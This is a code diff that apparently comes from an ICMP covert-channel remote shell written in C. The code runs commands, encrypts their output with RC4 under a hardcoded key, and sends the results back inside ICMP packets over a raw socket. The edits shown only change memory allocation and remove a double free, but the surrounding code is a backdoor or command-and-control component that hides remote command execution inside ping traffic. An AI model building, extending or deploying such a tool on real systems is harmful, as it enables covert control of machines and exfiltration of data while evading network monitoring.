@@ -72,10 +72,8 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
     fread(temp_buffer, BUFFER_SIZE, 1, ptr);
     temp_buffer_size = strlen((char *) temp_buffer);
 
-    buffer = calloc(temp_buffer_size, 1);
+    buffer = malloc(temp_buffer_size);
     strncpy(buffer, (char *) temp_buffer, temp_buffer_size);
-
-    //memset(output, '\0', temp_buffer_size);
 
     // encrypt the output
     RC4((unsigned char *) buffer, temp_buffer_size, (unsigned char *) KEY, KEY_LENGTH, output);
@@ -147,21 +145,21 @@ void interact(int sockfd, char *dest_ip) {
     struct iphdr *ip; // holds the IP header
     struct icmphdr *icmp; // holds the ICMP header
     unsigned char *data; // holds the ICMP's data section
-    unsigned char *output = (unsigned char *) calloc(BUFFER_SIZE, 1); // holds the output of the command
+    unsigned char *output; // holds the output of the command
     unsigned char *packet; // holds the packet
     struct sockaddr_in addr;
     size_t bytes_num, packet_size, output_size; 
+
+    output = (unsigned char *) malloc(BUFFER_SIZE);
 
     // calculating the packet size
     packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + BUFFER_SIZE;
 
     // allocating a buffer to store the recieved ICMP packet
     packet = (unsigned char *) malloc(packet_size);
-    data = (unsigned char *) malloc(BUFFER_SIZE);
 
-    if (packet == NULL || data == NULL) {
+    if (packet == NULL) {
         fprintf(stdout, "Error: Cannot allocate memory\n");
-        free(data);
         free(packet);
         return;
     }
@@ -207,11 +205,8 @@ void interact(int sockfd, char *dest_ip) {
 
         // clean up the packet buffer for the next usage
         memset(packet, '\0', packet_size);
-
     }
 
-    free(packet);
-    free(data);
     free(output);
     free(packet);
 }
